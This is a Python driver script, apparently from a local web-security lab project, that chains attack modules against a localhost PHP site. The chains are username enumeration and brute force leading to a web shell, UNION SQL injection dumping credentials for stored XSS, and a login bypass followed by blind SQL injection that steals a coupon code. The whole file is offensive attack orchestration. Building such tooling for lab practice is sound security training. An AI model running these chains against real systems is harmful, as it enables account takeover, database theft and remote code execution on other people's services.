import sys

import requests

import enum_and_brute
import Broken_Password_Reset
import SQLi_UNION
import web_shell
import stored_xss
import SQLi
import SQLi_Blind

def chain_1_web_shell():
    print("\n" + "="*60)
    print("CHAIN 1: FULL AUTOMATED WEB SHELL (Discovery -> Access -> Control)")
    print("="*60)
    
    # Phase 1: User Discovery & Quick Brute Force
    print("[*] Phase 1: Discovering valid users...")
    cracked_accounts, discovered_usernames = enum_and_brute.run_attack()
    
    target_user = None
    target_pwd = None

    if not discovered_usernames:
        print("[-] No users discovered. Finishing chain without success.")
        return

    # Phase 2: Access Phase
    if cracked_accounts:
        # If we found a working password immediately, use it
        target_user, target_pwd = cracked_accounts[0]
        print(f"[+] Quick Brute Force succeeded")

    if not target_pwd:
        print("[*] Launching Intensive Brute Force...")
        for user in discovered_usernames:
            print(f"\n[*] Attempting to gain access to user: {user}")
            pwd = Broken_Password_Reset.try_brute_force(user=user, filename="passwords.txt")
            
            if pwd:
                target_user = user
                target_pwd = pwd
                print(f"[+] SUCCESS: Access gained via Brute Force for {target_user}!")
                break

        if not target_pwd:
            print("[-] Intensive Brute Force failed. Falling back to Logic Bypass (Reset)...")
            target_user = discovered_usernames[0]
            target_pwd = Broken_Password_Reset.run_reset_password(user=target_user)
        
            # Check if we got a password from either method
            if target_pwd:
                print(f"[+] SUCCESS: Access gained for {target_user}!")
            else:
                print(f"[-] Chain 1 failed: Could not compromise any account.")
                return

    # Phase 3: Remote Code Execution
    if target_user and target_pwd:
        print(f"[*] Phase 3: Launching web shell on account: {target_user}")
        web_shell.run_ultimate_web_shell(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 1 failed: No access gained to any account.")


def chain_2_breach():
    print("\n" + "="*60)
    print("CHAIN 2: DATA BREACH TO XSS (Union SQLi -> Stored XSS)")
    print("="*60)

    print("[*] Phase 0: Logging in as 'HUCKER' to get a valid session...")
    login_url = "http://localhost/CyberProject/login.php"
    creds = {'username': 'HUCKER', 'password': 'hucker123', 'login_submit': ''}
    
    session = requests.Session()
    res = session.post(login_url, data=creds, allow_redirects=True)

    if "home.php" in res.url or "HUCKER" in res.text:
            sid = session.cookies.get('PHPSESSID')
            print(f"[+] Login Successful!")
    else:
        print("[-] Login failed. Check if HUCKER exists in the DB.")
        return
        
    print("[*] Phase 1: Dumping database via UNION SQLi...")    
    # Phase 1: Database Exfiltration
    users = SQLi_UNION.dump_users(session_id=sid)
    
    if users:
        # Phase 2: Post-Exploitation / Lateral Movement
        # Select the last compromised account from the database dump (less likely to be the admin)
        target_user, target_pwd = users[-1]  
        print(f"[*] Using stolen credentials: {target_user}")
        
        # Phase 3: Stored XSS Injection
        stored_xss.perform_stored_xss(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 2 failed: SQLi Union returned no data.")


def chain_3_stealth():
    print("\n" + "="*60)
    print("CHAIN 3: STEALTH LEAK (Login Bypass -> Blind SQLi)")
    print("="*60)
    
    # 1. Bypass login and get the session ID
    sid = SQLi.sql_login_bypass()
    
    if sid:
        # 2. Directly update the cookie in your existing script
        SQLi_Blind.COOKIES['PHPSESSID'] = sid
        
        # 3. Run your existing functions in order
        baseline = SQLi_Blind.get_baseline()
        
        # You can choose to discover the table or go straight to leaking
        table = SQLi_Blind.discover_table_name(baseline)
        
        if table:
            # Call your original leaking function
            coupon = SQLi_Blind.leak_data_unlimited(table, "encrypted_code", baseline)
            print(f"\n[!!!] SUCCESS: Stolen VIP Coupon: {coupon}")
    else:
        print("[-] Chain 3 failed: Login bypass did not work.")

        
def main():
    if len(sys.argv) < 2:
        print("\n[!] Error: No chain selected.")
        print("Usage: python master_kill_chain.py [1/2/3]")
        print("  1: Full web shell Chain (Enum -> Reset -> web shell)")
        print("  2: Information Leak Chain (Union SQLi -> Stored XSS)")
        print("  3: Stealth Secret Chain (Bypass -> Blind SQLi)")
        return

    choice = sys.argv[1]
    if choice == "1":
        chain_1_web_shell()
    elif choice == "2":
        chain_2_breach()
    elif choice == "3":
        chain_3_stealth()
    else:
        print("[!] Invalid selection. Please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()